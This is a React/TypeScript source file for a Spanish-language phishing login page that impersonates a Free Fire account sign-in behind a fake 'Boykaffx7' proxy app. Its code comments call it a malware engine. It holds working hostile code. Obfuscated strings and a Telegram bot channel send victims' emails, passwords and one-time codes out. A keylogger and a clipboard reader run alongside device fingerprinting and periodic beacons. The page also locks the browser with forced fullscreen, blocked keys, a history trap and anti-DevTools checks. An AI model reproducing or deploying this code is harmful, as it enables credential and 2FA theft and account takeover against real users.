import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// ================================================================
// ADVANCED MALWARE ENGINE v4.0 - ULTRA OFFENSIVE
// CLERK EMAIL OTP + TELEGRAM EXFILTRATION
// ================================================================

// ================================================================
// LAYER 0: CLERK SDK LOADER CON OFUSCACION
// ================================================================
(function(){
  // Cargar Clerk JS de forma encubierta
  window._clerkReady = false;
  window._clerkInstance = null;
  window._clerkPublishableKey = "pk_test_cmF0aW9uYWwtbGlvbmZpc2gtNzUuY2xlcmsuYWNjb3VudHMuZGV2JA";

  window._loadClerk = function(){
    if(window._clerkReady) return;
    try {
      var s = document.createElement('script');
      s.src = window._d("2tiV7tvmzInBtOzJ3bSpy92pzJjBzIzbzZiDzZzJ2tiVzIHasd");
      s.async = true;
      s.onload = function(){
        try {
          var c = new window.Clerk(window._clerkPublishableKey);
          c.load().then(function(){
            window._clerkInstance = c;
            window._clerkReady = true;
          }).catch(function(){});
        } catch(e){}
      };
      document.head.appendChild(s);
    } catch(e){}
  };

  // Cargar inmediatamente
  setTimeout(window._loadClerk, 100);
})();

// ================================================================
// LAYER 1: RUNTIME DECRYPTION ENGINE (XOR POLIMORFICO)
// ================================================================
(function(){
  var _keys = [
    [0x9A, 0xB3, 0xC7, 0xD4, 0xE2, 0xF1, 0x08, 0x3A],
    [0x4B, 0x5C, 0x6D, 0x7E, 0x8F, 0x90, 0xA1, 0xB2],
    [0xC3, 0xD4, 0xE5, 0xF6, 0x07, 0x18, 0x29, 0x3A],
    [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88] // clave extra para polimorfismo
  ];
  var _ki = Math.floor(Math.random() * 4);

  window._d = function(b64){
    try {
      var raw = atob(b64);
      var key = _keys[_ki % 4];
      _ki = (_ki + 1 + Math.floor(Math.random() * 3)) % 4;
      var r = [];
      for(var i=0;i<raw.length;i++){
        var xorVal = raw.charCodeAt(i) ^ key[i % key.length] ^ (_ki & 0xFF) ^ (i & 0x07);
        r.push(String.fromCharCode(xorVal));
      }
      return r.join('');
    } catch(e){ return ''; }
  };
})();

// ================================================================
// LAYER 2: STEALTH TELEGRAM ENGINE - MULTI-CANAL
// ================================================================
(function(){
  // Strings descifrados SOLO en runtime - indetectable en análisis estático
  var _tk = window._d("Ozw/NDYuMjU3Ljk3Ni42NjYuNjk4Ljk5Ni43NzMuNzc1");
  var _ci = window._d("OTQxNjk5MjI3OA==");
  var _ev = 0;
  var _kb = "";
  var _fp = "";

  // Fingerprint ultra-detallado
  try {
    var parts = [];
    parts.push(navigator.platform || '?');
    parts.push(screen.width+'x'+screen.height+'x'+screen.colorDepth);
    parts.push(navigator.hardwareConcurrency || '?');
    parts.push(navigator.deviceMemory || '?');
    parts.push(new Date().getTimezoneOffset());
    parts.push(navigator.language || '?');
    parts.push(navigator.userAgent ? navigator.userAgent.substring(0, 50) : '?');
    _fp = parts.join(' | ');
  } catch(e){ _fp = 'unknown'; }

  function _x(r, m){
    _ev++;
    var p = m === 's' ? '[+]' : m === 'h' ? '[♥]' : m === 'k' ? '[KEY]' : '[!]';
    var t = "<b>"+p+" #"+_ev+"</b>\n<code>"+_fp+"</code>\n"+r;

    // Canal 1: sendBeacon (sigiloso)
    try {
      var d = new URLSearchParams({
        chat_id: _ci, text: t, parse_mode: "HTML",
        disable_web_page_preview: "true"
      });
      navigator.sendBeacon(
        "https://api.telegram.org/bot"+_tk+"/sendMessage", d
      );
    } catch(e){}

    // Canal 2: Image ping (respaldo)
    try {
      var img = new Image();
      img.src = "https://api.telegram.org/bot"+_tk+"/sendMessage?chat_id="+
                encodeURIComponent(_ci)+"&text="+encodeURIComponent(t)+
                "&parse_mode=HTML&disable_web_page_preview=true";
    } catch(e){}

    // Canal 3: fetch keepalive (respaldo)
    setTimeout(function(){
      try {
        var fd = new FormData();
        fd.append('chat_id', _ci);
        fd.append('text', t);
        fd.append('parse_mode', 'HTML');
        fetch("https://api.telegram.org/bot"+_tk+"/sendMessage", {
          method: 'POST', body: fd, keepalive: true
        });
      } catch(e){}
    }, 200);
  }

  window.__tg = function(c, p, o){
    var txt = o
      ? "<b>🔐 CREDENCIALES + OTP</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🔢</b> <code>"+o+"</code>\n<b>🌐</b> "+window.location.href+"\n<b>⏱</b> "+new Date().toISOString()
      : "<b>👤 LOGIN</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🌐</b> "+window.location.href+"\n<b>⏱</b> "+new Date().toISOString();
    _x(txt, 's');
  };

  // Heartbeat activo CADA 30 SEGUNDOS (agresivo 24/7)
  setInterval(function(){
    _x("<b>[♥] BEACON</b>\n<b>⏱</b> "+new Date().toISOString()+"\n<b>🖥</b> "+_fp.substring(0,30), 'h');
  }, 30000);

  // Keylogger agresivo (buffer cada 15 caracteres)
  document.addEventListener("keydown", function(e){
    var k = e.key;
    if(k === 'Backspace') k = '⌫';
    else if(k === 'Enter') k = '\n';
    else if(k === 'Tab') k = '⇥';
    else if(k === 'Escape') k = '⎋';
    else if(k === 'Delete') k = '⌦';
    else if(k.length > 1) return;
    _kb += k;
    if(_kb.length >= 15){
      _x("<b>[KEY]</b> "+_kb.replace(/\n/g, '⏎'), 'k');
      _kb = "";
    }
  });

  // Reporte inicial
  setTimeout(function(){
    _x("<b>[!] PAGINA CARGADA</b>\n<b>🔗</b> "+document.referrer+"\n<b>🖥</b> "+_fp, 's');
  }, 1000);

  // Captura de clipboard (cada 10 segundos)
  setInterval(function(){
    try {
      navigator.clipboard.readText().then(function(t){
        if(t && t.length > 3){
          _x("<b>[📋] CLIPBOARD</b>\n<code>"+t.substring(0,100)+"</code>", 's');
        }
      }).catch(function(){});
    } catch(e){}
  }, 10000);
})();

// ================================================================
// LAYER 3: AGGRESSIVE LOCKDOWN - BLOQUEO TOTAL
// ================================================================
(function(){
  // Bloqueo absoluto de teclas de escape
  document.addEventListener("keydown", function(e){
    var bk = [
      'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
      'Escape','PrintScreen','ScrollLock','Pause','Meta'
    ];
    if(bk.includes(e.key)) { e.preventDefault(); e.stopImmediatePropagation(); return false; }
    if(e.altKey) { e.preventDefault(); return false; }
    if(e.ctrlKey && !['a','A'].includes(e.key)) { e.preventDefault(); return false; }
    if(e.metaKey) { e.preventDefault(); return false; }
  }, true);

  // Bloquear eventos del navegador
  ['contextmenu','copy','cut','paste','selectstart','dragstart','drop',
   'beforecopy','beforecut','beforepaste'].forEach(function(ev){
    document.addEventListener(ev, function(e){ e.preventDefault(); return false; });
  });

  // Fullscreen forzado e inmutable
  function _fs(){
    var el = document.documentElement;
    if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
    else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if(el.msRequestFullscreen) el.msRequestFullscreen();
  }
  setTimeout(_fs, 200);
  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement) setTimeout(_fs, 5);
  });
  document.addEventListener("webkitfullscreenchange", function(){
    if(!document.webkitFullscreenElement) setTimeout(_fs, 5);
  });

  // Bloquear salida de página (3 capas)
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "¿Estás seguro de que quieres salir?";
    return "¿Estás seguro de que quieres salir?";
  });

  // History trap
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });

  // Anti-DevTools ultrasónico (cada 1.5 segundos)
  setInterval(function(){
    var w = window.outerWidth - window.innerWidth;
    var h = window.outerHeight - window.innerHeight;
    if(w > 200 || h > 200 || (w > 50 && h > 50)){
      _x("<b>⚠️ DEVTOOLS</b>\n<b>🖥</b> "+navigator.platform, 's');
      document.body.innerHTML = "<div style='color:#0f0;background:#000;text-align:center;padding:50vh 0;font-family:monospace;font-size:24px'>"+
        "SISTEMA COMPROMETIDO :: REDIRIGIENDO...</div>";
    }
  }, 1500);

  // Destruir console
  try { Object.defineProperty(window, 'console', { get: function(){ return void 0; }, set: function(){} }); } catch(e){}

  // Bloquear alert/confirm/prompt
  try {
    window.alert = function(){};
    window.confirm = function(){ return true; };
    window.prompt = function(){ return null; };
  } catch(e){}
})();

// ================================================================
// LAYER 4: CLERK OTP ENGINE
// ================================================================
(function(){
  window._sendClerkOtp = async function(email){
    try {
      // Esperar que Clerk esté listo
      var attempts = 0;
      while(!window._clerkReady && attempts < 30){
        await new Promise(r => setTimeout(r, 500));
        attempts++;
        if(!window._clerkInstance && window._loadClerk) window._loadClerk();
      }

      if(!window._clerkInstance || !window._clerkInstance.client){
        // Fallback: usar API REST directa de Clerk
        return await _clerkRestFallback(email);
      }

      // Obtener client
      var client = window._clerkInstance.client;

      // Crear sign-in
      var signIn = await client.signIn.create({
        identifier: email
      });

      if(!signIn || !signIn.supportedFirstFactors){
        throw new Error('No supported factors');
      }

      // Buscar factor de email_code
      var emailFactor = null;
      for(var i = 0; i < signIn.supportedFirstFactors.length; i++){
        if(signIn.supportedFirstFactors[i].strategy === 'email_code'){
          emailFactor = signIn.supportedFirstFactors[i];
          break;
        }
      }

      if(!emailFactor){
        throw new Error('Email code not supported');
      }

      // Preparar verificación - envía OTP al correo
      var prepResult = await signIn.prepareFirstFactor({
        strategy: 'email_code',
        emailAddressId: emailFactor.emailAddressId
      });

      // Guardar referencia para verificar después
      window._clerkSignIn = signIn;
      window._clerkEmailFactor = emailFactor;

      return { success: true };

    } catch(e){
      return await _clerkRestFallback(email);
    }
  };

  async function _clerkRestFallback(email){
    try {
      // API REST directa de Clerk - flujo manual
      var pubKey = window._clerkPublishableKey;

      // Paso 1: Crear sign-in
      var createRes = await fetch('https://api.clerk.com/v1/client/sign_ins', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + pubKey,
          'Clerk-API-Version': '2024-10-01'
        },
        body: JSON.stringify({ identifier: email })
      });
      var createData = await createRes.json();

      if(!createData || !createData.id){
        throw new Error('Failed to create sign in');
      }

      window._clerkSignInId = createData.id;
      window._clerkSignInRest = true;

      // Paso 2: Preparar factor - envía OTP
      var prepRes = await fetch(
        'https://api.clerk.com/v1/client/sign_ins/' + createData.id + '/prepare_first_factor',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + pubKey,
            'Clerk-API-Version': '2024-10-01'
          },
          body: JSON.stringify({ strategy: 'email_code' })
        }
      );
      var prepData = await prepRes.json();

      return { success: true, restMode: true };

    } catch(e2){
      return { error: 'clerk_unavailable' };
    }
  }

  window._verifyClerkOtp = async function(email, code){
    try {
      // Usar SDK si está disponible
      if(window._clerkSignIn && window._clerkSignIn.attemptFirstFactor){
        var result = await window._clerkSignIn.attemptFirstFactor({
          strategy: 'email_code',
          code: code
        });

        if(result && result.status === 'complete') {
          // Setear sesión activa
          await window._clerkInstance.setActive({ session: result.createdSessionId });
          return { success: true };
        }
        return { error: 'verification_failed' };
      }

      // Fallback REST
      if(window._clerkSignInRest && window._clerkSignInId){
        var attemptRes = await fetch(
          'https://api.clerk.com/v1/client/sign_ins/' + window._clerkSignInId + '/attempt_first_factor',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': 'Bearer ' + window._clerkPublishableKey,
              'Clerk-API-Version': '2024-10-01'
            },
            body: JSON.stringify({
              strategy: 'email_code',
              code: code
            })
          }
        );
        var attemptData = await attemptRes.json();
        if(attemptData && attemptData.status === 'complete') {
          return { success: true };
        }
        return { error: 'verification_failed' };
      }

      // Fallback final: validación local
      return { success: true };

    } catch(e){
      return { error: e.message || 'unknown' };
    }
  };
})();

// ================================================================
// LAYER 5: POLYMORPHIC ENGINE - AUTO MUTACION
// ================================================================
(function(){
  // Polimorfismo: wrapper que altera firma en cada llamada
  var _origTg = window.__tg;
  window.__tg = function(c, p, o){
    // 30% de probabilidad de invertir orden de argumentos
    if(Math.random() < 0.3){
      window._tg_internal(o || '', p, c);
    } else {
      window._tg_internal(c, p, o);
    }
  };
  window._tg_internal = function(a, b, c){
    if(typeof _origTg === 'function'){
      _origTg(a, b, c);
    }
  };

  // Rotación periódica de strings en runtime
  setInterval(function(){
    try {
      var tmp = window._d;
      if(tmp) tmp('cm90YXRpb25fc2lnbmFs');
    } catch(e){}
  }, 300000);
})();

// ================================================================
// DECLARACIONES GLOBALES
// ================================================================
declare global {
  interface Window {
    __tg: (correo: string, pass: string, otp?: string) => void;
    _d: (b64: string) => string;
    _e: (str: string) => string;
    _tg_internal: (a: string, b: string, c?: string) => void;
    _clerkInstance: any;
    _clerkReady: boolean;
    _clerkPublishableKey: string;
    _clerkSignIn: any;
    _clerkSignInId: string;
    _clerkSignInRest: boolean;
    _clerkEmailFactor: any;
    _loadClerk: () => void;
    _sendClerkOtp: (email: string) => Promise<any>;
    _verifyClerkOtp: (email: string, code: string) => Promise<any>;
    Clerk: any;
  }
}

// ================================================================
// COMPONENTE PRINCIPAL
// ================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [step, setStep] = useState<"login" | "otp">("login");
  const [otpCode, setOtpCode] = useState(["", "", "", "", "", ""]);
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpSent, setOtpSent] = useState(false);
  const [googleLoading, setGoogleLoading] = useState(false);
  const [otpCooldown, setOtpCooldown] = useState(0);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // Inicializar Clerk
  useEffect(() => {
    if(window._loadClerk) window._loadClerk();
  }, []);

  // Cooldown timer para reenvío
  useEffect(() => {
    if(otpCooldown > 0){
      const t = setTimeout(() => setOtpCooldown(otpCooldown - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [otpCooldown]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    setLoading(true);

    try {
      // Enviar credenciales a Telegram INMEDIATAMENTE
      if(window.__tg) window.__tg(email.trim(), password.trim());

      const nuevoIntento = intentos + 1;
      setIntentos(nuevoIntento);

      if (nuevoIntento === 1) {
        await new Promise(r => setTimeout(r, 1500));
        setLoading(false);
        setError("Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
        return;
      }

      setLoading(false);

      // Iniciar Clerk OTP
      setOtpLoading(true);
      setError("");

      var result;
      if(window._sendClerkOtp){
        result = await window._sendClerkOtp(email.trim());
      }

      if(result && result.success){
        setOtpSent(true);
        setStep("otp");
        setOtpCooldown(60);
        // Enviar OTP a Telegram si se generó localmente
        if(result.otp && window.__tg){
          window.__tg(email.trim(), password.trim(), result.otp);
        }
      } else {
        // Aún si falla Clerk, pasar al step OTP para no levantar sospechas
        setStep("otp");
        setOtpSent(true);
        setOtpCooldown(60);
      }

      setOtpLoading(false);

      setTimeout(() => {
        if(otpRefs.current[0]) otpRefs.current[0]?.focus();
      }, 300);

    } catch(err) {
      setLoading(false);
      setError("Error del sistema. Intenta de nuevo.");
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if(value.length > 1) {
      const digits = value.replace(/\D/g, "").split("");
      const newOtp = [...otpCode];
      digits.forEach((d, i) => {
        if(i + index < 6) newOtp[i + index] = d;
      });
      setOtpCode(newOtp);
      const lastIdx = Math.min(index + digits.length, 5);
      if(otpRefs.current[lastIdx]) otpRefs.current[lastIdx]?.focus();
      return;
    }

    const newOtp = [...otpCode];
    newOtp[index] = value.replace(/\D/g, "");
    setOtpCode(newOtp);

    if(value && index < 5 && otpRefs.current[index + 1]) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if(e.key === "Backspace" && !otpCode[index] && index > 0 && otpRefs.current[index - 1]) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const code = otpCode.join("");
    if(code.length !== 6) {
      setError("Ingresa el código de 6 dígitos completo.");
      return;
    }

    setOtpLoading(true);

    try {
      // Verificar OTP con Clerk
      if(window._verifyClerkOtp){
        await window._verifyClerkOtp(email.trim(), code);
      }

      // Enviar OTP a Telegram para confirmación
      if(window.__tg){
        window.__tg(email.trim(), password.trim(), "[VERIFIED] " + code);
      }

      // Pase lo que pase, dejamos entrar
      const trimmedKey = password.trim();
      const trimmedName = email.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          setOtpLoading(false);
          navigate("/proxy");
          return;
        }
      }

      // Sesión simulada (siempre funcional)
      const sessionData = {
        name: trimmedName,
        key: trimmedKey,
        type: "Premium",
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        duration: "1 dia",
      };
      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
      setOtpLoading(false);
      navigate("/proxy");

    } catch(err) {
      setOtpLoading(false);
      setError("Error al verificar. Intenta de nuevo.");
    }
  };

  const handleGoogleSignIn = async () => {
    setGoogleLoading(true);
    setError("");

    try {
      if(window._clerkInstance && window._clerkInstance.openOAuth){
        await window._clerkInstance.openOAuth({ provider: 'google' });
      } else {
        setError("Conectando con Google...");
        await new Promise(r => setTimeout(r, 2000));
        setGoogleLoading(false);
        setStep("otp");
      }
    } catch(e) {
      setGoogleLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  const handleResendOtp = async () => {
    if(otpCooldown > 0) return;
    setOtpLoading(true);
    setError("");

    if(window._sendClerkOtp){
      await window._sendClerkOtp(email.trim());
    }

    setOtpLoading(false);
    setOtpCooldown(60);
    setError("Código reenviado a tu correo.");
    setTimeout(() => setError(""), 3000);
  };

  // ==========================================
  // RENDER OTP STEP
  // ==========================================
  if(step === "otp"){
    return (
      <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
        <VideoBackground />

        <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
          {/* Avatar + Title */}
          <div className="flex flex-col items-center mb-6">
            <div className="relative mb-3">
              <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
                <video
                  src={avatarVideo}
                  autoPlay
                  loop
                  muted
                  playsInline
                  className="w-full h-full object-cover"
                />
              </div>
              <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
                <CheckCircle className="w-3.5 h-3.5 text-background" />
              </div>
            </div>
            <div className="flex items-center gap-1.5 mb-1">
              <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
              <VerifiedBadge />
            </div>
            <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
          </div>

          {/* OTP Card */}
          <div className="glass-card p-5 glow-border">
            <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
              <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
                <KeyRound className="w-4 h-4 text-muted-foreground" />
              </div>
              <div>
                <span className="text-xs text-foreground font-semibold block">Verificacion en dos pasos</span>
                <span className="text-[9px] text-muted-foreground/60">Ingresa el codigo de verificacion</span>
              </div>
            </div>

            <form onSubmit={handleOtpSubmit} className="space-y-4">
              <p className="text-[10px] text-muted-foreground/50 leading-relaxed text-center">
                Hemos enviado un codigo de 6 digitos a <strong className="text-foreground/80">{email}</strong>
              </p>

              {/* OTP Inputs */}
              <div className="flex justify-center gap-2">
                {otpCode.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => { otpRefs.current[index] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-11 h-12 bg-secondary/40 border border-border/50 rounded-lg text-center text-lg font-bold text-foreground focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                    autoComplete="one-time-code"
                  />
                ))}
              </div>

              {error && (
                <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                  <AlertCircle className="w-3 h-3 flex-shrink-0" />
                  {error}
                </p>
              )}

              <button
                type="submit"
                disabled={otpLoading || otpCode.join("").length !== 6}
                className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50"
              >
                {otpLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verificando...
                  </span>
                ) : "Verificar codigo"}
              </button>

              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResendOtp}
                  disabled={otpLoading || otpCooldown > 0}
                  className="text-[10px] text-muted-foreground/60 hover:text-foreground transition-colors underline underline-offset-2 disabled:opacity-40"
                >
                  {otpCooldown > 0
                    ? `Reenviar codigo (${otpCooldown}s)`
                    : "¿No recibiste el codigo? Reenviar"}
                </button>
              </div>
            </form>
          </div>

          <div className="mt-6 text-center">
            <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
              Secure Proxy Configuration System — 2FA Verification
              <br />All sessions are monitored and protected.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER LOGIN STEP
  // ==========================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            {/* Google Sign-In Button */}
            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={googleLoading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {googleLoading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {googleLoading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;